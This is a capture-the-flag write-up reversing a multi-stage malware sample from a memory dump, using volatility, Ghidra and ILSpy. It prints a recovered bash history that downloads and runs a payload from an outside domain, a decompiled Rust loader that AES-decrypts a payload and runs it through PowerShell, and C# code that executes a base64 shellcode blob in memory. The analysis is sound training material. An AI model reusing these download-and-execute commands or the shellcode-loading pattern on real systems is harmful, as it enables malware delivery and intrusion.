# Pandora's bane (insane)
For this challenge we get a large memory dump.

First I started by analyzing the process list and respective memory locations with `volatility`.
After a bit of trial and error I have turned my attention to the files that exist within the dump.

We can use the `vol -f mem.raw windows.filescan` command to get a list of available files and their addresses.
Then once we find a file we can use the `vol -f mem.raw windows.dumpfiles --virtaddr <addr>` command to dump the contents of the file.

One such file was the `ConsoleHost_history.txt` file:
```
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
whoami /all
```

Okay this is not too useful except maybe for the fact that WSL is being used, but I got that from the process list as well.

Hm, but if WSL is used, then we have another history file we could check: the `.bash_history` file

```bash
rm .bash_history 
whoami
id
cat /etc/passwd
ping google.com
ps aux
uname -a
cat /etc/os-release 
wget windowsliveupdater.com/updater -O /tmp/.apt-cache
chmod +x /tmp/.apt-cache 
/tmp/.apt-cache 
```

It looks like this file drops the next stage inside the `tmp` folder.
We can use the same method we have used sofar to extract that file as well
Okay this file contains an elf header, so it is time to fire up Ghidra and reverse engineer it.

When looking at the `main` function I have noticed immediately that this is compiled from rust code.
```c
void main(int param_1,undefined8 param_2)

{
  code *local_8;
  
  local_8 = rust_loader::main;
  std::rt::lang_start_internal
            (&local_8,anon.6b03302ec1ee582ae67c97070480a9e5.0.llvm.11976028101026120347,
             (long)param_1,param_2,0);
  return;
}
```

Looking at the other `main` function I saw that some powershell commands were executed to enable execution and to disable saving history.
Then some interesting file was opened:
```c
std::fs::OpenOptions::new(&local_430);
sVar4 = std::fs::OpenOptions::write((int)&local_430,(void *)0x1,__n);
__file = (char *)std::fs::OpenOptions::create(sVar4,1);
iVar2 = std::fs::OpenOptions::truncate(__file,1);
std::fs::OpenOptions::_open(&local_618,iVar2,"/dev/shm/.font-unix",0x13);
```

`/dev/shm/.font-unix` I don't recognize this to be a usual file!

Then I see that some `UdpSocket` is being read from
```c
std::net::udp::UdpSocket::recv((int)&local_508,&local_6a0,(size_t)&local_430,0x400);
```

And a bit further down, the content is written to the file
```c
local_508 = std::io::Write::write_all(local_5f8,(long)uStack_610 + uVar8,(long)local_608 - uVar8);
```

So you would think now we can check what the dropped file is, but not so fast!

```c
std::fs::OpenOptions::new(&local_430);
sVar4 = std::fs::OpenOptions::read((int)&local_430,(void *)0x1,__nbytes);
std::fs::OpenOptions::_open(&local_618,sVar4,"/dev/shm/.font-unix",0x13);
// ...
std::fs::{impl#5}::read_to_end(&local_430,&local_6bc,&local_630);
```

The file we have just written to, is being read back!
Then some decoding/decrypting is about to take place

```c
base64::engine::Engine::decode(&local_430,&DAT_001522c5,&local_618);
// ...

    <alloc::vec::Vec<u8>as_hex::FromHex>::from_hex
              (puVar10,
               "99b97bf329968477cc3aae5dd24fdc12a04177b98f66444e03a9a14c2b1758823a85861eccaadc8ecd4f 36d201a510ce\n        $bytes = [System.Convert]::FromBase64String(\"\")\n        $asm  = [Reflection.Assembly]::Load($bytes)\n        $method = $asm.GetType(\"SecurityUpda te.Updater\")\n        $method::run()called `Option::unwrap()` on a `None` value/rust c/d5a82bbd26e1ad8b7401f6a718a9c57c96905483/library/alloc/src/collections/btree/naviga te.rs/rustc/d5a82bbd26e1ad8b7401f6a718a9c57c96905483/library/core/src/slice/iter.rs"
              );
// ...

        <alloc::vec::Vec<u8>as_hex::FromHex>::from_hex
                  (&local_430,
                   "3a85861eccaadc8ecd4f36d201a510ce\n        $bytes = [System.Convert]::FromBase64S tring(\"\")\n        $asm = [Reflection.Assembly]::Load($bytes)\n        $method  = $asm.GetType(\"SecurityUpdate.Updater\")\n        $method::run()called `Option: :unwrap()` on a `None` value/rustc/d5a82bbd26e1ad8b7401f6a718a9c57c96905483/libra ry/alloc/src/collections/btree/navigate.rs/rustc/d5a82bbd26e1ad8b7401f6a718a9c57c 96905483/library/core/src/slice/iter.rs"
                  );
// ...

          libaes::Cipher::new_256(&local_430,uVar1);
          libaes::Cipher::cbc_decrypt
                    (&local_6a0,&local_430,CONCAT44(uStack_65c,uStack_660),local_658,
                     CONCAT44(uStack_67c,uStack_680),local_678);
          local_608 = (undefined **)local_690;
          local_618 = CONCAT44(uStack_69c,local_6a0);
          uStack_610 = (int *)CONCAT44(uStack_694,uStack_698);
          base64::engine::Engine::encode(&local_508,&DAT_001522c5,&local_618);
```

So:
* The file content is base64 decoded
* We get the key and the IV from the binary as hex encoded strings. Here ghdira struggles a bit with where the string exactly ends, but we can still get the general idea: the hex string at the start is the value we are interested in
* A new AES-256 CBC cipher is created, and the content is decrypted
* The decdrypted content is base64 encoded again

After all this the following command execution takes place:
```c
      std::sys::unix::process::process_common::Command::new(&local_618,"powershell.exe",0xe);
      memcpy(&local_508,&local_618,0xd0);
                /* try { // try from 0010c3de to 0010c47c has its CatchHandler @ 0010cad5 */
      std::sys::unix::process::process_common::Command::arg(&local_508,"-Command",8);
      std::sys::unix::process::process_common::Command::arg(&local_508,pcStack_6b0,local_6a8);
```

So we know the downloaded file is decrypted and then executed as powershell.
I have extracted the file in question to `stage2.enc`.
I have written the `dec.py` script in order to decrypt the second stage
Then we get `stage2.bin` which is a .NET assembly.
But we expected powershell code right? Well not precisely.
In fact some formatting code was executed prior to the powershell execution from the rust binary, and the format string used:

```ps1
$bytes = [System.Convert]::FromBase64String("")
$asm = [Reflection.Assembly]::Load($bytes)
$method = $asm.GetType("SecurityUpdate.Updater")
$method::run()
```
The payload got base64 encoded after decryption and passed to the ps1 inline script which will base64 decode it and then load the assembly and run it.

So let's load the second stage into ILSpy.
The program checks if it is running in a virtualized environment and if not begins malicious activity:
```cs
byte[] array = Convert.FromBase64String("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");
		IntPtr intPtr = VirtualAlloc(IntPtr.Zero, (uint)array.Length, 4096u, 64u);
		Marshal.Copy(array, 0, intPtr, array.Length);
		func func = (func)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(func));
		func();
		VirtualFree(intPtr, 0u, 32768u);
```

It will load the base64 decoded instructions into the process memory and execute it!
I have decoded and put the instructions into `stage3.bin` (`stage3.enc` contains the encoded version)

Now this file really just contains raw instructions without any executable/dll header.
I have tried to run this under linux and it worked for the most part.

The binary starts with multiple self modifying steps, where it decrypt some part of itself and then continues from the new part, which again decrypts some other part.

After a couple of decryption rounds it seems that normal execution being, however this fails on linux, because it starts going to `%gs`, possibly to get some shared libraries, which is not working under linux.

Therefore I have loaded the same binary under windows.
I used `x64dbg` with `blobrunner64` in order to start the file (on linux I wrote my own shellcode loader).

Again I have stepped through the code and each debugging stage.
Hardware breakpoints are useful, because software breakpoints could get overwritten by the decryption process.

After some amount of stepping through the code I have noticed that the `rcx` register points to a string which contains the flag. It must have been decrypted during the many rounds of self modification.
